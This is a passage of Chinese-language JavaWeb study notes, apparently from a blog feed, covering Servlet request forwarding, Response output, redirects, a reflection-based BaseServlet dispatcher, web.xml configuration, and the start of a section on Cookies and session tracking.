<li><strong>实现方式</strong>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">								<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	req.getRequestDispatcher(<span class="string">&quot;资源B路径&quot;</span>).forward(req, resp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>请求转发资源间共享数据：使用Request对象</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 存储数据到 request 域中</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(String name, Object o)</span>;</span><br><span class="line"><span class="comment">// 根据 key，获取值</span></span><br><span class="line">Object <span class="title function_">getAttribute</span><span class="params">(String name)</span>;</span><br><span class="line"><span class="comment">// 根据 key，删除该键值对</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">removeAttribute</span><span class="params">(String name)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>请求转发特点</strong></li>
</ul>
<blockquote>
<ul>
<li>浏览器地址栏路径不变化</li>
<li>只能转发到当前服务器的内部资源</li>
<li><code>一次请求</code>，可以在转发的资源间使用 <code>request</code> 共享数据</li>
</ul>
</blockquote>
<h2 id="2-Response"><a href="#2-Response" class="headerlink" title="2. Response"></a>2. Response</h2><h3 id="Response对象常用方法"><a href="#Response对象常用方法" class="headerlink" title="Response对象常用方法"></a>Response对象常用方法</h3><blockquote>
<p><strong>Response用于设置响应数据</strong>。例如：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">								<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 使用 Response对象设置响应数据</span></span><br><span class="line">	resp.setHeader(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	resp.getWriter().write(<span class="string">&quot;&lt;h1&gt;hello, world&lt;/h1&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Response对象设置响应行数据的方法</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置响应状态码</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setStatus</span><span class="params">(<span class="type">int</span> sc)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Response对象设置响应头数据的方法</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置响应头键值对</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setHeader</span><span class="params">(String name, String value)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Response对象设置响应体数据的方法</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取字符输出流</span></span><br><span class="line">PrintWriter <span class="title function_">getWriter</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">// 获取字节输出流</span></span><br><span class="line">ServletOutPutStream <span class="title function_">getOutPutStream</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Response-响应字符数据"><a href="#Response-响应字符数据" class="headerlink" title="Response 响应字符数据"></a>Response 响应字符数据</h3><ul>
<li><strong>使用</strong></li>
</ul>
<p><strong>①通过Response对象获取字符输出流</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br></pre></td></tr></table></figure>
<p><strong>②写数据</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">writer.write(<span class="string">&quot;xxxxxxxxxxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong></p>
<ul>
<li>该流<code>不需要关闭</code>，随着响应结束，response对象销毁，由服务器关闭。</li>
</ul>
</blockquote>
<p><strong>测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">										<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	response.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">	writer.write(<span class="string">&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Response-响应字节数据"><a href="#Response-响应字节数据" class="headerlink" title="Response 响应字节数据"></a>Response 响应字节数据</h3><ul>
<li><strong>使用</strong></li>
</ul>
<p><strong>①通过Response对象获取字节输出流</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br></pre></td></tr></table></figure>
<p><strong>②写数据</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outputStream.write(字节数据);</span><br></pre></td></tr></table></figure>
<p><strong>测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">										<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 读取文件</span></span><br><span class="line">	<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;jpg路径&quot;</span>);</span><br><span class="line">	<span class="comment">// 获取字节输出流</span></span><br><span class="line">	<span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">	<span class="comment">// 完成流的copy</span></span><br><span class="line">	<span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">	<span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>((len = fis.read(buff)) != -<span class="number">1</span>)&#123;</span><br><span class="line">		outputStream.write(buff, <span class="number">0</span>, len);</span><br><span class="line">	&#125;</span><br><span class="line">	fis.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>IOUtils工具类使用</strong></li>
</ul>
<p><strong>①导入坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>②使用</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">IOUtils.copy(输入流,输出流);</span><br></pre></td></tr></table></figure>
<p><strong>测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line"> 										<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 读取文件</span></span><br><span class="line">	<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;jpg路径&quot;</span>);</span><br><span class="line">	<span class="comment">// 获取字节输出流</span></span><br><span class="line">	<span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">	IOUtils.copy(fis, outputStream);</span><br><span class="line">	fis.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="响应数据中文乱码问题"><a href="#响应数据中文乱码问题" class="headerlink" title="响应数据中文乱码问题"></a>响应数据中文乱码问题</h3><p>响应数据如果存在中文数据，则会乱码。是因为通过response获取的字符输出流默认编码为<code>ISO-8859-1</code>。</p>
<ul>
<li><strong>解决方案：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两种方式：</span></span><br><span class="line"><span class="comment">// 1. </span></span><br><span class="line">resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">resp.setHeader(<span class="string">&quot;contentType&quot;</span>, <span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ul>
<li><strong>重定向（redirect）：一种资源跳转方式</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"><strong>- 实现方式：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">								<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 1. 设置响应状态码</span></span><br><span class="line">	resp.setStatus(<span class="number">302</span>);</span><br><span class="line">	<span class="comment">// 2. 设置响应头</span></span><br><span class="line">	resp.setHeader(<span class="string">&quot;location&quot;</span>, <span class="string">&quot;资源B的路径&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 或者直接使用下方一句代码</span></span><br><span class="line">	resp.sendRedirect(<span class="string">&quot;资源B的路径&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>重定向特点</strong></li>
</ul>
<blockquote>
<ul>
<li>浏览器地址栏路径发生变化</li>
<li>可以重定向到任意位置的资源（服务器内外部均可）</li>
<li><code>两次请求</code>，不能在多个资源间使用<code>request</code>共享数据</li>
</ul>
</blockquote>
<h2 id="3-请求转发与重定向路径问题"><a href="#3-请求转发与重定向路径问题" class="headerlink" title="3. 请求转发与重定向路径问题"></a>3. 请求转发与重定向路径问题</h2><ul>
<li><strong>明确路径使用对象</strong></li>
</ul>
<blockquote>
<ul>
<li>浏览器使用：需要加虚拟目录（项目访问路径）</li>
<li>服务端使用：不需要加虚拟目录</li>
</ul>
</blockquote>
<p>在请求转发中，是服务器内部完成资源路径的跳转的行为。因此在请求转发中不需要加虚拟目录。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不需要加虚拟目录</span></span><br><span class="line">req.getRequestDispatcher(<span class="string">&quot;路径&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>重定向是一种服务器指导客户端进行资源路径跳转访问的行为，还是浏览器自身在使用。因此在重定向中需要加虚拟目录。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需要加虚拟目录</span></span><br><span class="line">resp.sendRedirect(<span class="string">&quot;路径&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="六、Servlet代码优化"><a href="#六、Servlet代码优化" class="headerlink" title="六、Servlet代码优化"></a>六、Servlet代码优化</h1><blockquote>
<ul>
<li><strong>在通过继承HttpServlet书写Servlet的类的过程中，通常是一个类只能完成一个需求，这会导致web层的Servlet数量太多，不利于管理与编写。</strong></li>
</ul>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></p>
</blockquote>
<hr>
<blockquote>
<ul>
<li><strong>解决方法：将Servlet进行归类，对于同一个实体的操作方法，写到一个Servlet中。比如：UserServlet、BrandServlet，并将其<code>urlPattern</code>配置为<code>目录匹配</code>。之后自定义一个<code>BaseServlet</code>类，使用请求路径进行<code>方法分发</code>，替换HttpServlet的根据<code>请求方式</code>进行方法分发</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
</ul>
<hr>
<ul>
<li><strong>在通过继承HttpServlet书写Servlet的类时，如何根据<code>请求方式</code>执行<code>doGet()</code>或<code>doPost()</code>是通过HttpServlet中的<code>service()</code>方法确定的。因此我们要完成通过<code>请求路径</code>进行<code>方法分发</code>的需求，需要重写<code>service()</code>方法。</strong></li>
</ul>
<hr>
<p> <strong>原<code>service()</code>方法如图：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></p>
</blockquote>
<h2 id="优化步骤"><a href="#优化步骤" class="headerlink" title="优化步骤"></a>优化步骤</h2><blockquote>
<p><strong>① 自定义<code>BaseServlet</code>类，替换HttpServlet，使用请求路径进行<code>方法分发</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 替换 HttpServlet， 根据请求路径进行方法分发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 1. 获取请求路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> req.getRequestURI();</span><br><span class="line">        <span class="comment">// 2. 获取方法名 -- 最后一段路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> uri.substring(uri.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 3. 执行方法</span></span><br><span class="line">        <span class="comment">// 3.1 获取相应实体类Servlet字节码对象</span></span><br><span class="line">        <span class="comment">// 谁调用我（this 所在的方法），this 就代表谁</span></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">BaseServlet</span>&gt; cls = <span class="built_in">this</span>.getClass();</span><br><span class="line">        <span class="comment">// 3.2 获取方法 Method 对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            <span class="comment">// 3.3 执行方法</span></span><br><span class="line">            method.invoke(<span class="built_in">this</span>, req, resp);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>② 定义实体类Servlet并继承<code>BaseServlet</code>，并将其<code>urlPattern</code>配置为<code>目录匹配</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/brand/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BrandServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectAll</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ............................</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后在每次的请求中，服务器都会先执行重写的<code>service()</code>方法，根据请求路径进行方法分发。</p>
<h1 id="七、-XML配置方式"><a href="#七、-XML配置方式" class="headerlink" title="七、 XML配置方式"></a>七、 XML配置方式</h1><ul>
<li>Servlet从3.0版本开始支持使用注解配置，3.0版本前只支持XML配置方式。</li>
<li><strong>步骤</strong><br>① 编写Servlet类<br>② 在web.xml中配置该Servlet</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servletr-name</span>&gt;</span>定义的Servlet应用名字<span class="tag">&lt;/<span class="name">servletr-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servletr-class</span>&gt;</span>对应的具体Servlet类文件<span class="tag">&lt;/<span class="name">servletr-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">//地址映射</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">servletr-name</span>&gt;</span>定义的Servlet应用名字<span class="tag">&lt;/<span class="name">servletr-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>访问路径<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>会话跟踪技术（Cookie &amp; Session）</title>
    <url>/posts/bb085914.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><blockquote>
<p> <strong>会话跟踪技术</strong></p>
</blockquote>
<ul>
<li><strong>会话：用户打开浏览器，访问web服务器的资源，会话建立，直到有一方断开连接，会话结束。在一次会话中，可以包含<code>多次</code>请求与响应。</strong></li>
<li><strong>会话跟踪：一种维护浏览器状态的方法，服务器需要识别多次请求是否来自于同一浏览器，以便在同一次会话的多次请求间<code>共享数据</code>。</strong></li>
<li><strong>HTTP协议是<code>无状态</code>的，每次浏览器向服务器请求时，服务器都会将该请求视为<code>新的</code>请求，因此我们需要会话跟踪技术来实现会话内数据共享。</strong></li>
</ul>
<blockquote>
<p><strong><code>Cookie</code>和<code>Session</code>指的是什么？</strong></p>
<ul>
<li>Cookie与Session是域对象，所谓域就相当于给存储的内容设置一个边界，将存储的内容存储到这片区域内。例如我们要实现购物车添加或删除商品，就需要使用Cookie与Session技术。</li>
</ul>
</blockquote>
<h1 id="二、Cookie"><a href="#二、Cookie" class="headerlink" title="二、Cookie"></a>二、Cookie</h1><h2 id="1-Cookie基本原理及使用"><a href="#1-Cookie基本原理及使用" class="headerlink" title="1. Cookie基本原理及使用"></a>1. Cookie基本原理及使用</h2><blockquote>
<ul>
<li><code>Cookie</code>：客户端会话技术，将数据保存到客户端，以后每次请求都携带Cookie数据进行访问。</li>
</ul>
</blockquote>
<ul>
<li><strong>Cookie的实现基于<code>HTTP协议</code></strong></li>
</ul>
<blockquote>
<ul>
<li>请求头：cookie</li>
<li>响应头：set-cookie</li>
</ul>
</blockquote>
<ul>
<li><strong>Cookie的工作原理</strong></li>
</ul>
<blockquote>
<p>① 客户端第一次发送请求到服务器端。<br>② 服务器端创建Cookie，该Cookie中包含相关信息，然后将该Cookie发送到客户端。<br>③ 客户端再次访问服务器端时会携带服务器端创建的Cookie。<br>④ 服务器端通过Cookie中携带的数据区分不同的用户。</p>
</blockquote>
<ul>
<li><strong>Cookie使用：</strong></li>
</ul>
<blockquote>
<p><strong>发送Cookie</strong></p>
</blockquote>
<p>①创建Cookie对象，设置数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(key, value);</span><br></pre></td></tr></table></figure>
<p>②发送Cookie到客户端：使用Response对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 1. 创建 Cookie 对象</span></span><br><span class="line">	<span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">	<span class="comment">// 2. 发送 Cookie</span></span><br><span class="line">	response.addCookie(cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>获取Cookie</strong></p>
</blockquote>
<p>①获取客户端携带的所有Cookie：使用Request对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie[] cookies = request.getCookies();</span><br></pre></td></tr></table></figure>
<p>②遍历数组，获取每一个Cookie对象<br>③使用Cookie对象方法获取数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cookie.getName();		<span class="comment">// 获取键的内容</span></span><br><span class="line">cookie.getValue();		<span class="comment">// 获取值的内容</span></span><br></pre></td></tr></table></figure>
<p><strong>测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 获取 cookie</span></span><br><span class="line">	Cookie[] cookies = request.getCookies();</span><br><span class="line">	<span class="comment">// 遍历数组</span></span><br><span class="line">	<span class="keyword">for</span>(Cookie cookie:cookies)&#123;</span><br><span class="line">		<span class="comment">// 获取数据</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cookie.getName();</span><br><span class="line">		<span class="keyword">if</span>(name.equals(<span class="string">&quot;所需要的cookie键值&quot;</span>))&#123;</span><br><span class="line">			<span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">			<span class="comment">// 相应处理</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-关于Cookie"><a href="#2-关于Cookie" class="headerlink" title="2. 关于Cookie"></a>2. 关于Cookie</h2><h3 id="Cookie存活时间"><a href="#Cookie存活时间" class="headerlink" title="Cookie存活时间"></a>Cookie存活时间</h3><pre><code>默认情况下，Cookie存储在浏览器内存中，当浏览器关闭，内存释放，Cookie被销毁。
</code></pre>
<blockquote>
<p>设置方法： <code>setMaxAge(int seconds)</code> 设置Cookie存活时间。</p>
<ol>
<li>&#x3D;&#x3D;正数&#x3D;&#x3D;：将Cookie写入浏览器所在电脑的硬盘，<code>持久化</code>存储。到时间<code>自动删除</code>。</li>
<li>&#x3D;&#x3D;负数&#x3D;&#x3D;：默认值，Cookie在当前浏览器内存中，当<code>浏览器关闭</code>，则Cookie<code>销毁</code></li>
<li>&#x3D;&#x3D;零&#x3D;&#x3D;：<code>删除</code>对应Cookie</li>
</ol>
</blockquote>
<h3 id="Cookie存储中文数据"><a href="#Cookie存储中文数据" class="headerlink" title="Cookie存储中文数据"></a>Cookie存储中文数据</h3><blockquote>
<p>Cookie不能直接存储中文。 若需要存储，则需要进行<code>转码</code>：URL编码，一般使用<code>UTF-8</code>编码即可。不推荐使用GBK等中文编码，因为浏览器不一定支持，而且JavaScript也不支持GBK编码。</p>
</blockquote>
<p>&#x3D;&#x3D;示例如下：&#x3D;&#x3D;</p>
<p><strong>创建Cookie：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="string">&quot;划水艺术家&quot;</span>;</span><br><span class="line"><span class="comment">// URL 编码</span></span><br><span class="line">value = URLEncoder.encode(value, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;username&quot;</span>, value);</span><br></pre></td></tr></table></figure>
<p><strong>获取Cookie：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cookie.getName();</span><br><span class="line"><span class="keyword">if</span>(name.equals(<span class="string">&quot;username&quot;</span>))&#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> URLDecoder.decode(cookie.getValue(), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cookie获取范围"><a href="#Cookie获取范围" class="headerlink" title="Cookie获取范围"></a>Cookie获取范围</h3><blockquote>
<ul>
<li><strong>同一服务器中多项目Cookie共享问题</strong></li>
</ul>
<ol>
<li>默认情况下不能共享</li>
<li><code>setPath(String path)</code>：设置Cookie的获取范围，默认为当前虚拟目录路径。<br>如果想要同一服务器中多项目共享Cookie，可以将path设置为 “&#x2F;“，即<code>setPath(&quot;/&quot;)</code></li>
</ol>
<hr>
<ul>
<li><strong>不同服务器Cookie共享问题</strong></li>
</ul>
<ol>
<li><code>setDomain(String path)</code>：如果设置一级域名相同，那么多个服务器之间Cookie可以共享，path变量必须以<code>.</code>开头</li>
<li><code>setDomain(&quot;.abc.com&quot;)</code>：那么aaa.abc.com和bbb.abc.com中Cookie可以共享</li>
</ol>
</blockquote>
<h3 id="Cookie常用API"><a href="#Cookie常用API" class="headerlink" title="Cookie常用API"></a>Cookie常用API</h3><blockquote>
<p> <strong><code>Cookie 对象操作方法</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置与 Cookie 对象的值。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取与 Cookie 对象的值。</span></span><br><span class="line">String <span class="title function_">getValue</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 设置 Cookie 存活时间（以秒为单位）</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setMaxAge</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取 Cookie 存活时间（以秒为单位）</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getMaxAge</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 设置 Cookie 适用的路径</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setPath</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取 Cookie 适用的路径</span></span><br><span class="line">String <span class="title function_">getPath</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 设置 Cookie 适用的域</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取 Cookie 适用的域</span></span><br><span class="line">String <span class="title function_">getDomain</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p> <strong><code>Response 对象操作方法</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在响应头中增加一个相应的 Set-Cookie头字段</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addCookie</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> <strong><code>Request 对象操作方法</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取客户端携带的 Cookie</span></span><br><span class="line">Cookie[] GetCookie()</span><br></pre></td></tr></table></figure>

